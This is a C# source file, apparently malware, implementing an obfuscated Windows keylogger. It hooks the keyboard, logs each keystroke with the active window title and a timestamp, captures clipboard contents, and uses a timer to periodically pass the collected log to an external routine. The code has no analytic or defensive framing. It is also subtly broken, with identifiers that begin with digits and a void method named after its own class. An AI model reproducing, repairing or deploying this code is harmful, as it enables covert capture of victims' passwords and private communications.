using System;
using System.Security;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using UHyll;

namespace Ch9qVeSrN4
{

	public class SetKeylogTimer
	{
		private readonly Cc1E7of1Vi KeyTimer;
		private readonly System.Timers.Timer Timer;

		public void InstallKeyboardHook()
		{
			this.KeyTimer.KeyloggingInstallation();
			this.KeyTimerEnabled = true;
			this.Timer.Start();
		}
		public bool KeyTimerEnabled { get; private set; }

		public bool YuTLi
		{
			get
			{
				return (Control.ModifierKeys & Keys.Shift) != Keys.None;
			}
		}
		public bool QOktx
		{
			get
			{
				return (Control.ModifierKeys & Keys.Alt) != Keys.None;
			}
		}
		public bool DtO7
		{
			get
			{
				return (Control.ModifierKeys & Keys.Control) != Keys.None;
			}
		}

		public bool bV0cHE
		{
			[SecuritySafeCritical]
			get
			{
				return (FNu.GetKeyState(20) & 1) != 0;
			}
		}

		public void SetKeylogTimer()
		{
			this.KeyTimer = new Cc1E7of1Vi();
			this.KeyTimer.KeyDown += this.er3;
			if (J16ZIJ.JNyPIz6)
			{
				this.0GetMacAddressz3IfIr = new LOHPeZLPgq();
				this.0GetMacAddressz3IfIr.Changed += this.auJCioqUnK;
				this.0GetMacAddressz3IfIr.X74();
			}
			this.Timer = new System.Timers.Timer();
			this.Timer.Elapsed += this.K4hzOqR;
			this.Timer.Interval = (double)(60000 * J16ZIJ.42TP);
		}

	public void OGdy()
	{
		this.KeyTimer.I4HG1();
		this.KeyTimerEnabled = false;
		this.Timer.Stop();
	}

	private void K4hzOqR(object hQiM, ElapsedEventArgs O7r)
	{
		if (string.IsNullOrEmpty(this.KeyData))
			return;

		bool lockTaken = false;
		try
		{
			Monitor.Enter(this.hA6, ref lockTaken);
			lnY86oB.a8WWqwjtn2K(this.KeyData);

			this.KeyData = "";
		}
		finally
		{
			if (lockTaken)
			{
				Monitor.Exit(this.hA6);
			}
		}
	}

	private string lgz4()
	{
		this.6h40Ercywt = FNu.GetForegroundWindow();

		FNu.GetWindowThreadProcessId(this.6h40Ercywt, ref this.Y7UDD);

		int length = FNu.GetWindowTextLength(this.6h40Ercywt) + 1;
		StringBuilder stringBuilder = new StringBuilder(length);

		if (FNu.GetWindowText(this.6h40Ercywt, stringBuilder, length) > 0)
		{
			return stringBuilder.ToString();
		}

		return null;
	}
	private void YlbPh()
	{
		if (this.AWsK != this.Dpi)
		{
			if (!string.IsNullOrEmpty(this.KeyData) &&
				!this.KeyData.EndsWith("<br>") &&
				!this.KeyData.EndsWith("<hr>"))
			{
				this.KeyData += "<br>";
			}

			this.AWsK = $"<b>[ {this.Dpi} ]</b> ({DateTime.Now})<br>";
			this.KeyData += this.AWsK;
		}

		this.AWsK = this.Dpi;
	}

	private void er3(Keys key)
	{
		switch (key)
		{
			case Keys.Back:
				this.KeyData += "{BACK}";
				break;
			case Keys.Enter:
				this.KeyData += "{ENTER}";
				break;
			case Keys.Tab:
				this.KeyData += "{TAB}";
				break;
			case Keys.Escape:
				this.KeyData += "{ESC}";
				break;
			case Keys.Space:
				this.KeyData += " ";
				break;
			case Keys.Capital:
				this.KeyData += "{CAPSLOCK}";
				break;
			case Keys.Left:
				this.KeyData += "{KEYLEFT}";
				break;
			case Keys.Right:
				this.KeyData += "{KEYRIGHT}";
				break;
			case Keys.Up:
				this.KeyData += "{KEYUP}";
				break;
			case Keys.Down:
				this.KeyData += "{KEYDOWN}";
				break;
			case Keys.Insert:
				this.KeyData += "{INSERT}";
				break;
			case Keys.Delete:
				this.KeyData += "{DEL}";
				break;
			case Keys.Home:
				this.KeyData += "{HOME}";
				break;
			case Keys.End:
				this.KeyData += "{END}";
				break;
			case Keys.PageUp:
				this.KeyData += "{PageUp}";
				break;
			case Keys.PageDown:
				this.KeyData += "{PageDown}";
				break;

			case Keys.F1: this.KeyData += "{F1}"; break;
			case Keys.F2: this.KeyData += "{F2}"; break;
			case Keys.F3: this.KeyData += "{F3}"; break;
			case Keys.F4: this.KeyData += "{F4}"; break;
			case Keys.F5: this.KeyData += "{F5}"; break;
			case Keys.F6: this.KeyData += "{F6}"; break;
			case Keys.F7: this.KeyData += "{F7}"; break;
			case Keys.F8: this.KeyData += "{F8}"; break;
			case Keys.F9: this.KeyData += "{F9}"; break;
			case Keys.F10: this.KeyData += "{F10}"; break;
			case Keys.F11: this.KeyData += "{F11}"; break;
			case Keys.F12: this.KeyData += "{F12}"; break;

			default:
				if (!(this.bV0cHE && this.YuTLi) && !this.QOktx)
				{
					this.KeyData += tk0S0Qc3bB((uint)key).ToLower();
				}
				else
				{
					this.KeyData += tk0S0Qc3bB((uint)key).ToUpper();
				}
				break;
		}
	}

	private string tk0S0Qc3bB(uint 68hv9IO)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] lpKeyState = new byte[255];
				if (!FNu.GetKeyboardState(lpKeyState))
				{
					return "";
				}
				IntPtr foregroundWindow = FNu.GetForegroundWindow();
				int num2 = 0;
				int windowThreadProcessId = FNu.GetWindowThreadProcessId(foregroundWindow, ref num2);
				IntPtr keyboardLayout = FNu.GetKeyboardLayout(windowThreadProcessId);
				FNu.ToUnicodeEx(68hv9IO, 68hv9IO, lpKeyState, stringBuilder, Convert.ToInt32(16), Convert.ToUInt32(0), keyboardLayout);
				return stringBuilder.ToString();
			}
			catch
			{
			}
			return ((Keys)68hv9IO).ToString();
		}

	private void auJCioqUnK(LOHPeZLPgq uK68Ky)
	{
		string text = Clipboard.GetText();
		if (string.IsNullOrEmpty(text))
			return;

		text = text.Replace("&", "&amp;");
		text = text.Replace("<", "&lt;");
		text = text.Replace(">", "&gt;");
		text = text.Replace("\"", "&quot;");

		if (this.07Ztmkrl == text)
        return;

		this.07Ztmkrl = text;

		bool lockTaken = false;
		try
		{
			Monitor.Enter(this.hA6, ref lockTaken);
			this.KeyData += "<br><hr>Copied Text: <br>" + text + "<hr>";
		}
		finally
		{
			if (lockTaken)
				Monitor.Exit(this.hA6);
		}
	}
		private readonly LOHPeZLPgq 0GetMacAddressz3IfIr;
		private string KeyData;
		private readonly object hA6 = new object();
		private string Dpi;
		private IntPtr 6h40Ercywt;
		private int Y7UDD;
		private string AWsK;
		private string 07Ztmkrl = "";
}
